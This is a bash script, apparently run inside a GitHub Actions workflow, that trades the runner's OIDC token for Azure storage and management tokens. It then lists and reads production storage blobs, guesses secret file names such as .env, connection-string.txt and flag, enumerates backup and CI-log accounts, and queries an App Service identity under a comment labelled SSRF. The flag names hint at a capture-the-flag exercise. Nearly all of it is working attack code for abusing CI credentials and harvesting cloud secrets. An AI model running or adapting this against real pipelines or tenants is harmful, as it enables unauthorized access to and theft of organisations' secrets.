#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

# Storage token with OIDC
ST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
echo "ST len: ${#ST}"

# List blobs in config container
echo "=== LIST BLOBS in config container ==="
curl -sv -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" 2>&1

# Read specific blob with verbose
echo "=== READ internal-config.json VERBOSE ==="
curl -sv -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" 2>&1

# Try other blob names
for B in flag flag.txt config.json settings.json app-config.json connection-string.txt .env secret; do
  echo "=== READ $B ==="
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$B" | head -c 500
  echo
done

# Try other storage accounts containers
for A in sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  echo "=== $A containers ==="
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
    "https://$A.blob.core.windows.net/?comp=list" | head -c 500
  echo
  # List blobs in any found container
  for C in config backup logs data ci-logs artifacts flag; do
    R=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://$A.blob.core.windows.net/$C?restype=container&comp=list")
    echo "$R" | grep -q "BlobPrefix\|Blob\|Name" && echo "=== BLOBS in $A/$C ===" && echo "$R"
  done
done

# Try App Service managed identity endpoint via SSRF
echo "=== SSRF to MSI ==="
# The app might have MSI enabled. Try the well-known MSI endpoint
# These won't work because we're in GitHub Actions not in the App Service
# But let's try anyway via MGMT API to get the app's identity info
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)

# Get app's identity
curl -s -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2023-12-01" | jq '{identity,siteConfig:{appSettings:"REDACTED"},state,enabled}'

echo "=== DONE ==="
